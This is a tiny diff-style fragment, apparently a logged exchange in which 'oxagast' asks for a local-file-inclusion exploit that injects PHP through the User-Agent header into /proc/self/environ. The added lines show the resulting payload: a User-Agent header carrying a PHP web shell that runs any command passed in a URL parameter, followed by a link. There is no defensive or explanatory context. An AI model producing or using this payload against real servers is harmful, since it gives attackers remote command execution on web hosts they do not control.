@@ -1,0 +1,3 @@
+oxagast asked write an lfi exploit using /proc/self/environ injecting php code into the user-agent
+<---- snip ---->
+User-Agent: <?php system($_GET['cmd']); ?> https://franklin.oxasploits.com/said/283aef3c
